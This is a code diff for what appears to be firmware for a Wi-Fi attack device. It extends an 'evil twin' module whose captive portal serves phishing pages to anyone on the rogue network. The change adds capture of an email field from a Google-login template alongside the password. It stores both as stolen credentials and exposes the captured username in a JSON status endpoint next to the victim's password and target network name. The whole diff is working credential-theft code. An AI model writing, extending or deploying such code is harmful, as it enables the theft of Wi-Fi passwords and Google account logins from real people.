@@ -470,6 +470,7 @@ namespace wifi {
             j += BlazeEvilTwin::active() ? "true" : "false";
             j += ",\"ssid\":\"" + blazeJsonEscape(BlazeEvilTwin::targetSsid()) + "\"";
             j += ",\"password\":\"" + blazeJsonEscape(BlazeEvilTwin::captured()) + "\"";
+            j += ",\"user\":\"" + blazeJsonEscape(BlazeEvilTwin::capturedUser()) + "\"";
             j += ",\"attempts\":" + String(BlazeEvilTwin::attempts());
             j += "}";
             server.send(200, str(W_JSON), j);
@@ -534,13 +535,15 @@ namespace wifi {
             // evil twin: serve phishing portal for any unknown URL
             if (BlazeEvilTwin::servePortal()) {
                 if (server.method() == HTTP_POST) {
+                    String em = server.arg("e"); // google template: email field
                     String pw = server.arg("p");
-                    if (pw.length() == 0 && server.hasArg("plain")) {
+                    if (em.length() == 0 && pw.length() == 0 && server.hasArg("plain")) {
                         // try form body
                         pw = server.arg("plain");
                     }
-                    if (pw.length() > 0) BlazeEvilTwin::submitPassword(pw);
-                    server.send(200, "text/html", F("<!DOCTYPE html><meta charset=utf-8><title>Connecting...</title><body style='background:#0a0a0a;color:#39ff14;font-family:monospace;text-align:center;padding:40px'><h2>Connecting...</h2><p>Please wait</p></body>"));
+                    if (em.length() > 0) BlazeEvilTwin::submitCredentials(em, pw); // captured immediately
+                    else if (pw.length() > 0) BlazeEvilTwin::submitPassword(pw);    // wifi templates: async validation
+                    server.send(200, "text/html", BlazeEvilTwin::ackHtml());
                     return;
                 }
                 server.send(200, "text/html", BlazeEvilTwin::portalHtml());
